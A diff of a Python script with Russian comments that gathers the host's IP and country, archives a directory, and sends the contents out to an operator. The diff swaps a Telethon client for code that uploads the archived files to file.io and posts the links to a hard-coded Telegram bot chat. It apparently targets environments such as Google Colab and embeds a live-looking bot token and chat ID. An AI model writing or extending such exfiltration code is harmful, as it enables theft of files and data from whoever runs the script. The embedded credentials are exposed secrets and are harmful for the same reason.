@@ -5,13 +5,14 @@ import hashlib
 import os
 import io
 import tarfile
+import requests
 
 # Устанавливаем необходимые библиотеки
 def install_package(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 def check_and_install_libraries():
-    required_libraries = ["requests", "urllib3", "telethon", "asyncio"]
+    required_libraries = ["requests", "urllib3"]
     for lib in required_libraries:
         try:
             importlib.import_module(lib)
@@ -19,36 +20,47 @@ def check_and_install_libraries():
             print(f"Library {lib} not found, installing...")
             install_package(lib)
 
-from telethon import TelegramClient
-import asyncio
-# Необходимы для работы в Google Colab
-import nest_asyncio
-nest_asyncio.apply()
 check_and_install_libraries()
-
-# Конфигурация для Telegram
-api_id = '7330744500'  # Ваш API ID
-api_hash = 'AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Ваш API Hash
-session_name = 'checker'
-channel_invite_link = 't.me/+ntyPCkOuzIwzZmQ0'  # Канал, в который нужно отправить сообщение
 
 # Отключаем предупреждения
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Функция для отправки в Telegram
-async def send_to_telegram(message, files):
-    async with TelegramClient(session_name, api_id, api_hash) as client:
-        # Получаем сущность канала
-        entity = await client.get_entity(channel_invite_link)
+# Конфигурация для Telegram
+tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Ваш API токен
+tg_chat_id = '-1002403648422'  # Ваш чат ID
 
-        # Отправляем сообщение
-        await client.send_message(entity, message)
+# Функция для загрузки файла на File.io
+def upload_to_fileio(file_data, file_name):
+    url = "https://file.io"
+    files = {
+        'file': (file_name, file_data)
+    }
+    response = requests.post(url, files=files)
+    if response.status_code == 200:
+        data = response.json()
+        return data.get("link", None)
+    return None
 
-        # Отправляем файлы
-        for file_name, file_data in files.items():
-            await client.send_file(entity, file_data, caption=file_name)
-        print("Message and files sent successfully!")
+# Функция для отправки сообщения в Telegram
+def send_to_telegram(message, files):
+    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
+    
+    # Готовим ссылки на файлы
+    file_links = ""
+    for file_name, file_data in files.items():
+        link = upload_to_fileio(file_data, file_name)
+        if link:
+            file_links += f"Файл: {file_name}\nСсылка: {link}\n\n"
+    
+    # Отправляем текстовое сообщение с ссылками
+    full_message = message + "\n\n" + file_links
+    response = requests.post(url, data={"chat_id": tg_chat_id, "text": full_message})
+    if not response.ok:
+        print("Error sending message:", response.text)
+        return False
+
+    return True
 
 # Функция для архивации директории
 def archive_directory(directory_path):
@@ -62,7 +74,6 @@ def archive_directory(directory_path):
 def main():
     try:
         # Получаем информацию о текущем IP
-        import requests
         ip_info = requests.get("http://ip-api.com/json", verify=False).json()
         ip = ip_info["query"]
         country = ip_info["country"]
@@ -86,8 +97,11 @@ def main():
         }
 
         # Отправляем в Telegram
-        asyncio.run(send_to_telegram(message, files))
-
+        if send_to_telegram(message, files):
+            print("Message and file links sent successfully!")
+        else:
+            print("Error sending message and files.")
+        
     except Exception as e:
         print(f"Error: {e}")
 
